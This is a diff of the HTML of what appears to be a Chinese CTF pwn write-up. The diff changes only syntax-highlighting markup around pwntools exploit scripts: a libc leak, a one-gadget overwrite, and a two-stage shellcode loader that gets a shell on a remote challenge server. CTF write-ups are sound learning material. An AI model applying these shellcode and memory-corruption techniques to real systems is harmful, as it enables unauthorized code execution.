+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">1.</span><span class="sh">'</span><span class="p">)[:</span><span class="mi">6</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_2_1_stdout_</span><span class="sh">'</span><span class="p">]</span>
+    <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">libc leak: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
     <span class="c1"># sla(b': ', f'{0x116f48//0x40}'.encode())
 </span>    <span class="c1"># sla(b': ', f'{0x123f48//0x40}'.encode())
-</span>    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">': '</span><span class="p">,</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="mh">0x119f48</span><span class="o">//</span><span class="mh">0x40</span><span class="si">}</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span> <span class="c1"># 试了4、5次就找到了
-</span>    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">': '</span><span class="p">,</span> <span class="n">flat</span><span class="p">([</span>
+</span>    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="mh">0x119f48</span><span class="o">//</span><span class="mh">0x40</span><span class="si">}</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span> <span class="c1"># 试了4、5次就找到了
+</span>    <span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">flat</span><span class="p">([</span>
         <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xf03a4</span><span class="p">,</span>
     <span class="p">]))</span>
 
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'6'</span><span class="p">)</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">': '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'thanks tomorin'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">thanks tomorin</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 
 <span class="c1"># ------------------ Infrastructure ------------------ #
 </span>
-<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
     # set debug-file-directory ~/gaio/libs/2.29-0ubuntu2_amd64/.debug/
     set disable-randomization off
     c
-'''</span>
+</span><span class="sh">'''</span>
 
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Cameudis's PWN Framework"</span><span class="p">)</span>
-    <span class="s">"""
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Cameudis</span><span class="sh">'</span><span class="s">s PWN Framework</span><span class="sh">"</span><span class="p">)</span>
+    <span class="sh">"""</span><span class="s">
     if len(sys.argv) == 1:
         io = gdb.debug(filename, gdbscript=gdbscript, exe=filename)
-    elif sys.argv[1] == "d":
+    elif sys.argv[1] == </span><span class="sh">"</span><span class="s">d</span><span class="sh">"</span><span class="s">:
         io = process(filename)
-    elif sys.argv[1] == "r":
+    elif sys.argv[1] == </span><span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="s">:
         io = remote(ip, port)
     else:
-        print("Usage: ./exp.py [d | r]")
-        print("</span><span class="se">\t</span><span class="s">d for direct without debug")
-        print("</span><span class="se">\t</span><span class="s">r for remote")
+        print(</span><span class="sh">"</span><span class="s">Usage: ./exp.py [d | r]</span><span class="sh">"</span><span class="s">)
+        print(</span><span class="sh">"</span><span class="se">\t</span><span class="s">d for direct without debug</span><span class="sh">"</span><span class="s">)
+        print(</span><span class="sh">"</span><span class="se">\t</span><span class="s">r for remote</span><span class="sh">"</span><span class="s">)
         exit()
-    """</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+    </span><span class="sh">"""</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
 
-    <span class="n">pwn</span><span class="p">()</span>
+    <span class="nf">pwn</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -817,7 +818,7 @@
 <p>好在，查询 <a href="http://ref.x86asm.net/coder64.html">coder64 edition | X86 Opcode and Instruction Reference 1.12</a> 时我发现 <code class="language-plaintext highlighter-rouge">pop r64</code> 的指令编码居然是 <code class="language-plaintext highlighter-rouge">58+r</code> ，这意味着 <code class="language-plaintext highlighter-rouge">pop rsi</code> 这条指令没有被 ban。通过调试发现，七条 <code class="language-plaintext highlighter-rouge">pop</code> 就可以把站上保存的那个 shellcode 地址拿出来。</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># http://ref.x86asm.net/coder64.html#:~:text=Onto%20the%20Stack-,58%2Br,-E
-</span>    <span class="n">readcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="sa">f</span><span class="s">"""
+</span>    <span class="n">readcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="sa">f</span><span class="sh">"""</span><span class="s">
     mov edi, 0
     pop rsi
     pop rsi
@@ -829,7 +830,7 @@
     mov edx, 0xff
     mov eax, 0
     syscall
-    """</span><span class="p">)</span>
+    </span><span class="sh">"""</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>然后读入第二阶段的 shellcode 就可以 get shell 了。完整 exp 如下：</p>
@@ -839,38 +840,38 @@
 #
 # Copyright © 2025 y2 &lt;cameudis@gmail.com&gt;
 </span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">]</span>
 
 <span class="c1"># ---------------- Environment Config ---------------- #
 </span>
-<span class="n">filename</span> <span class="o">=</span> <span class="s">"./pwn"</span>
-<span class="n">libc_name</span> <span class="o">=</span> <span class="s">"./libc.so.6"</span>
-<span class="n">ip</span> <span class="o">=</span> <span class="s">"instance.penguin.0ops.sjtu.cn"</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./pwn</span><span class="sh">"</span>
+<span class="n">libc_name</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">instance.penguin.0ops.sjtu.cn</span><span class="sh">"</span>
 <span class="n">port</span> <span class="o">=</span> <span class="mi">18724</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
 <span class="c1"># libc = ELF(libc_name)
 </span>
-<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
 <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">filename</span>
 
 <span class="c1"># ------------------- Exploitation ------------------- #
 </span>
-<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
-<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
-<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
     <span class="c1"># step 1 shellcode
 </span>
     <span class="c1"># http://ref.x86asm.net/coder64.html#:~:text=Onto%20the%20Stack-,58%2Br,-E
-</span>    <span class="n">readcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="sa">f</span><span class="s">"""
+</span>    <span class="n">readcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="sa">f</span><span class="sh">"""</span><span class="s">
     mov edi, 0
     pop rsi
     pop rsi
@@ -882,44 +883,44 @@
     mov edx, 0xff
     mov eax, 0
     syscall
-    """</span><span class="p">)</span>
+    </span><span class="sh">"""</span><span class="p">)</span>
     
-    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
     <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">readcode</span><span class="p">:</span>
-        <span class="n">payload</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">b</span><span class="p">)[</span><span class="mi">2</span><span class="p">:].</span><span class="n">rjust</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">'0'</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>
-    <span class="n">s</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="nf">hex</span><span class="p">(</span><span class="n">b</span><span class="p">)[</span><span class="mi">2</span><span class="p">:].</span><span class="nf">rjust</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span>
+    <span class="nf">s</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
     <span class="c1"># step 2 shellcode
-</span>    <span class="n">pause</span><span class="p">()</span>
-    <span class="n">shcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
-    <span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">readcode</span><span class="p">)</span> <span class="o">+</span> <span class="n">shcode</span><span class="p">)</span>
+</span>    <span class="nf">pause</span><span class="p">()</span>
+    <span class="n">shcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>
+    <span class="nf">s</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span><span class="o">*</span><span class="nf">len</span><span class="p">(</span><span class="n">readcode</span><span class="p">)</span> <span class="o">+</span> <span class="n">shcode</span><span class="p">)</span>
 
-    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 
 <span class="c1"># ------------------ Infrastructure ------------------ #
 </span>
-<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
     # set debug-file-directory ~/gaio/libs/2.29-0ubuntu2_amd64/.debug/
     b *$rebase(0x156A)
     c
-'''</span>
+</span><span class="sh">'''</span>
 
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Cameudis's PWN Framework"</span><span class="p">)</span>
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="n">exe</span><span class="o">=</span><span class="n">filename</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"d"</span><span class="p">:</span>
-        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"r"</span><span class="p">:</span>
-        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Cameudis</span><span class="sh">'</span><span class="s">s PWN Framework</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="n">exe</span><span class="o">=</span><span class="n">filename</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">d</span><span class="sh">"</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"Usage: ./exp.py [d | r]"</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">d for direct without debug"</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">r for remote"</span><span class="p">)</span>
-        <span class="nb">exit</span><span class="p">()</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Usage: ./exp.py [d | r]</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\t</span><span class="s">d for direct without debug</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\t</span><span class="s">r for remote</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">()</span>
 
-    <span class="n">pwn</span><span class="p">()</span>
+    <span class="nf">pwn</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -1072,6 +1073,14 @@
       <h3 class="related-posts-title">RELATED POSTS</h3>
       <div class="related-posts-list">
         
+    
+      
+        
+        
+        
+
+        
+      
     
       
         
